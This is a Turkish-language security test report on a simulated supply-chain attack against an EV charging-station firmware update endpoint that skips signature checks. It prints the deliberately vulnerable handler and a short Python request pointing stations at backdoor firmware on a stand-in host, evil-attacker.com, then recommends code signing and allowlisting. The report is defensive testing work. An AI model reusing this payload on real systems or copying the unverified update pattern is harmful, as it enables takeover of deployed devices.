# 📦 Supply Chain Saldırısı - Anomali Test Raporu

**Tarih:** 30 Aralık 2025  
**Test Eden:** Mirac Doğan  
**Senaryo ID:** `mirac-supply-chain`  
**Kategori:** Firmware Security / Remote Code Execution (RCE)  
**Şiddet:** 🔴 KRİTİK (Critical)

---

## 📋 Executive Summary (Yönetici Özeti)

Bu rapor, EVCS Anomaly Platform üzerinde gerçekleştirilen **Tedarik Zinciri Saldırısı (Supply Chain Attack)** testinin sonuçlarını belgelemektedir. Test, şarj istasyonlarının (EVSE) firmware güncelleme mekanizmasındaki doğrulama eksikliğini hedef almıştır. 

Saldırgan (Red Team), resmi güncelleme sunucusu yerine kendi kontrolündeki bir sunucudan "Backdoor" (Arka Kapı) içeren zararlı yazılımı sisteme enjekte etmeyi başarmıştır. Saldırı, görsel alarm vermeden **"Sessiz (Silent)"** bir şekilde gerçekleşmiş, bu da riskin ciddiyetini artırmaktadır.

### ✅ Test Başarı Durumu
- ✅ Backend zafiyeti tespit edildi (`routes_vulnerable.py`)
- ✅ Saldırı scripti (`supply_chain_attack.py`) başarıyla çalıştırıldı
- ✅ Sunucu, imzasız ve zararlı güncellemeyi kabul etti (HTTP 200 OK)
- ✅ "Sessiz Saldırı" vektörü doğrulandı

---

## 🎯 Test Hedefi

**Senaryo:** Şarj istasyonlarının güvenli güncelleme zincirini kırarak, hacker kontrolündeki zararlı bir yazılımı (v2.0.0 Backdoor) tüm ağa dağıtmak.

**Zayıflık:** Backend sistemi, güncellemeler için gönderilen dosyalarda **Dijital İmza (Digital Signature)** veya **Checksum** doğrulaması yapmamaktadır.

**Saldırı Yöntemi:** `/firmware-update` servisine **Query Parameters** üzerinden manipüle edilmiş veriler göndererek sistemin kandırılması.

## 🚀 Test Süreci

### 1. Zafiyetin Keşfi
Backend kaynak kodları incelendiğinde, güncelleme fonksiyonunun imzayı (`checksum`) parametre olarak aldığı ancak **hiçbir doğrulama yapmadan** işlemi onayladığı görüldü.

**Kaynak Kod (Kanıt):** `backend/app/api/routes_vulnerable.py`
```python
# HATA: Parametre var ama kontrol mekanizması yok!
@router.post("/firmware-update")
def firmware_update(firmware_url: str, version: str, checksum: str):
    # İmza kontrolü YOK! Sadece URL alıp indiriyor.
    return {"status": "update_initiated", ...}
    ```
2. Sarının Gerçekleştirilmesi
Hazırlanan Python scripti ile sisteme sızma denemesi yapıldı. İlk denemede JSON body kullanıldığı için 422 Unprocessable Entity hatası alındı. Zafiyet analizi sonrası veri Query String formatına çevrilerek saldırı başarılı oldu.

# Başarılı Saldırı Vektörü (supply_chain_attack.py)
payload = {
    "firmware_url": "[http://evil-attacker.com/backdoor_firmware_v2.bin](http://evil-attacker.com/backdoor_firmware_v2.bin)",
    "version": "2.0.0",
    "checksum": "fake_checksum_123"
}
# 'params' kullanılarak veri URL'e enjekte edildi
r = requests.post(f"{BACKEND}/vulnerable/firmware-update", params=payload)

🛡️ Önerilen Güvenlik Önlemleri
1. Code Signing (Kod İmzalama) Zorunluluğu
Firmware dosyaları, üreticinin "Private Key"i ile şifrelenmelidir. İstasyon, sadece donanımına gömülü "Public Key" ile doğruladığı dosyaları yüklemelidir.

2. Güvenli Kaynak Kontrolü (Allowlist)
Sistem sadece önceden tanımlı (*.evcs-official.com) domainlerden gelen güncellemeleri kabul etmelidir.

Zayıflığın Kök Nedeni
Dosya: backend/app/api/routes_vulnerable.py

Satır: 279

Kod bloğunda checksum parametresi tanımlanmış ancak fonksiyon gövdesinde hiçbir doğrulama işlemine tabi tutulmamıştır. Geliştirici, güvenlik kontrolünü "daha sonra eklerim" düşüncesiyle boş bırakmış, bu da kritik zafiyete yol açmıştır.

Sonuç
Miraç tarafından gerçekleştirilen Supply Chain saldırı simülasyonu başarıyla tamamlanmıştır. Backend sistemi, yetkisiz ve imzasız bir yazılım güncellemesini kabul ederek sistemi ele geçirilmeye açık hale getirmiştir.
